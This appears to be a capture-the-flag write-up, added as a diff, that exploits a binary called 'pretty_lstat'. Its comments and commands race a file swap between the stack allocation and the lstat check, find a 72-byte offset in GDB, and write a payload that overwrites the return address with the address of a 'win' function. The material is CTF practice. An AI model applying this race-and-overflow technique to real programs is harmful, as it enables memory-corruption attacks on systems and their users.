@@ -1,0 +1,20 @@
+# The program goes through the arguments and checks if they're actually files. If so, it loads their content (one at a time) on the STACK (performing alloca before), so we can overflow the stack by changing the dimension of the content of the file between the alloca and the end of the computation of the lstat of that file. The goal is, as usual, to overwrite the ret addr with the addr of the function win, which prints the flag.
+
+while true; do cp hello.txt data.txt; cp xploit.txt data.txt; done
+while true; do ./pretty_lstat data.txt hello.txt hello.txt; done      # Increasing the number of arguments makes the check time longer for pretty_lstat, so the other while has enough time to change the content of data.txt
+
+# cyclic 500 > xploit.txt
+gdb ./pretty_lstat
+set args data.txt
+bp *0x401607    # Where the program starts the check on the files in the argv
+start           # data.txt should be the same as hello.txt here
+# When the bp is hit, we change the content of data.txt to xploit.txt
+# Now we continue to the segmentation fault, we get the "faulty" ret addr and write cyclic -l <addr> (it returns 72)
+# cyclic 72 > xploit.txt
+echo "Hello world" > hello.txt
+echo -n "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa" > xploit.txt
+echo -ne "\x96\x12\x40\x00\x00\x00\x00\x00" >> xploit.txt   # Address of funct. win, option -e allows to append raw bytes, while option -n removes the newline character at the end
+
+xxd xploit.txt  # Prints the content of the file in an hexadecimal format
+
+sudo dmesg      # Reports errors, faults and security failures
